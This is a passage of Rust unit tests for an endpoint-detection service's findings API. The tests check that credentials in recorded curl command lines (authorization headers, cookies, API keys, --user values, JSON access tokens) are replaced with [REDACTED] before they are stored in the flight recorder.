            .unwrap_or_else(|e| panic!("failed to read forged honey response: {e}"));
        let payload = String::from_utf8_lossy(&bytes);
        assert!(
            payload.contains("registered honey artifact"),
            "unexpected forged honey response: {payload}"
        );
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_bearer_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-bearer-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization: Bearer MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization:".to_string(),
                    "Bearer".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build bearer findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("bearer findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization: Bearer [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[3], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_authorization_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization: MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization:".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build authorization findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("authorization findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_cookie_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-cookie-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Cookie: session=MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Cookie:".to_string(),
                    "session=MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build cookie findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("cookie findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Cookie: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_api_key_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-api-key-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H X-Api-Key: MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "X-Api-Key:".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build api-key findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("api-key findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H X-Api-Key: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_x_auth_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-x-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H X-Auth: MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "X-Auth:".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build x-auth findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("x-auth findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H X-Auth: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_header_flag_assignment_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-header-flag-assignment-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl --header=X-Api-Key: MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "--header=X-Api-Key: MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build header flag assignment findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("header flag assignment findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl --header=X-Api-Key: [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[1], "--header=X-Api-Key: [REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_userinfo_flags_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let separate_token_observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-userinfo-flag-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl --user deploy:MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "--user".to_string(),
                    "deploy:MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let assignment_observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-userinfo-assignment-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl --user=deploy:MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "--user=deploy:MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [separate_token_observation, assignment_observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build userinfo flag findings request: {e}"));

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("userinfo flag findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .filter(|line| !line.trim().is_empty())
            .map(|line| {
                serde_json::from_str::<EndpointObservation>(line)
                    .unwrap_or_else(|e| panic!("failed to decode stored observation: {e}"))
            })
            .collect::<Vec<_>>();
        let separate = stored
            .iter()
            .find(|observation| {
                observation.process.process_guid.as_deref()
                    == Some("proc-userinfo-flag-redaction-1")
            })
            .unwrap_or_else(|| panic!("missing separate-token userinfo observation"));
        assert_eq!(
            separate.process.command_line.as_deref(),
            Some("curl --user deploy:[REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = &separate.event else {
            panic!("stored separate-token observation should remain process_exec");
        };
        assert_eq!(args[2], "deploy:[REDACTED]");

        let assignment = stored
            .iter()
            .find(|observation| {
                observation.process.process_guid.as_deref()
                    == Some("proc-userinfo-assignment-redaction-1")
            })
            .unwrap_or_else(|| panic!("missing assignment userinfo observation"));
        assert_eq!(
            assignment.process.command_line.as_deref(),
            Some("curl --user=deploy:[REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = &assignment.event else {
            panic!("stored assignment observation should remain process_exec");
        };
        assert_eq!(args[1], "--user=deploy:[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_compact_userinfo_flags_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-compact-userinfo-flag-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -udeploy:MY_RAW_SECRET https://api.example.invalid".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "-udeploy:MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build compact userinfo flag findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("compact userinfo flag findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -udeploy:[REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[1], "-udeploy:[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_json_payload_secret_fields_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-json-payload-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    r#"curl --data '{"access_token":"MY_RAW_SECRET","mode":"test"}' https://api.example.invalid"#
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "--data".to_string(),
                    r#"{"access_token":"MY_RAW_SECRET","mode":"test"}"#.to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build JSON payload redaction findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("JSON payload redaction findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(
                r#"curl --data '{"access_token":"[REDACTED]","mode":"test"}' https://api.example.invalid"#
            )
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], r#"{"access_token":"[REDACTED]","mode":"test"}"#);

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_spaced_json_payload_secret_fields_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-spaced-json-payload-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    r#"curl --data '{"access_token": "MY_RAW_SECRET", "mode": "test"}' https://api.example.invalid"#
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "curl".to_string(),
                    "--data".to_string(),
                    r#"{"access_token": "MY_RAW_SECRET", "mode": "test"}"#.to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build spaced JSON payload redaction findings request: {e}")
            });

        let response = app.oneshot(req).await.unwrap_or_else(|e| {
            panic!("spaced JSON payload redaction findings request failed: {e}")
        });
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some(
                r#"curl --data '{"access_token": "[REDACTED]", "mode": "test"}' https://api.example.invalid"#
            )
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[2], r#"{"access_token": "[REDACTED]", "mode": "test"}"#);

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_basic_authorization_header_command_line_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-basic-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization: Basic MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization:".to_string(),
                    "Basic".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build basic authorization findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("basic authorization findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization: Basic [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
            panic!("stored observation should remain process_exec");
        };
        assert_eq!(args[3], "[REDACTED]");

        let _ = std::fs::remove_file(flight_recorder_path);
    }

    #[tokio::test]
    async fn agent_edr_findings_redacts_token_authorization_header_before_recording() {
        let flight_recorder_path = test_flight_recorder_path();
        let _ = std::fs::remove_file(&flight_recorder_path);
        let mut state = test_state();
        state.edr_flight_recorder = Arc::new(Mutex::new(
            EndpointFlightRecorder::open(&flight_recorder_path)
                .unwrap_or_else(|e| panic!("failed to open test flight recorder: {e}")),
        ));
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .with_state(Arc::new(state));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-token-auth-header-redaction-1".to_string()),
                image: Some("/usr/bin/curl".to_string()),
                command_line: Some(
                    "curl -H Authorization: Token MY_RAW_SECRET https://api.example.invalid"
                        .to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::ProcessExec {
                image: "/usr/bin/curl".to_string(),
                args: vec![
                    "-H".to_string(),
                    "Authorization:".to_string(),
                    "Token".to_string(),
                    "MY_RAW_SECRET".to_string(),
                    "https://api.example.invalid".to_string(),
                ],
                env: BTreeMap::new(),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build token authorization findings request: {e}")
            });

        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("token authorization findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let recorded = std::fs::read_to_string(&flight_recorder_path)
            .unwrap_or_else(|e| panic!("failed to read flight recorder: {e}"));
        assert!(!recorded.contains("MY_RAW_SECRET"));
        let stored = recorded
            .lines()
            .find(|line| !line.trim().is_empty())
            .and_then(|line| serde_json::from_str::<EndpointObservation>(line).ok())
            .unwrap_or_else(|| panic!("missing stored endpoint observation"));
        assert_eq!(
            stored.process.command_line.as_deref(),
            Some("curl -H Authorization: Token [REDACTED] https://api.example.invalid")
        );
        let EndpointEvent::ProcessExec { args, .. } = stored.event else {
